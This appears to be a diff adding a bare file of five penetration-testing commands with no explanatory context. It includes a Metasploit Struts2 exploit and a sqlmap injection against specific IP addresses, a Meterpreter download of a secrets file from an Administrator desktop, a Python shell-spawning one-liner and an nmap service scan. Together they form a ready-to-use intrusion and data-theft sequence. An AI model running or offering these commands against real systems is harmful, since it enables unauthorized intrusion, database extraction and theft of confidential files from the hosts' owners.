@@ -1,0 +1,5 @@
+meterpreter > download C:\Users\Administrator\Desktop\secrets.txt
+msfconsole -q -x 'use exploit/multi/http/apache_struts2_exec; set RHOSTS 204.35.149.175; exploit'
+sqlmap -u http://28.157.57.227/login.php --data='username=admin&password=123' --dbs
+python -c 'import os; os.system("/bin/bash")'
+nmap -sV -p 1-1024 224.62.223.77
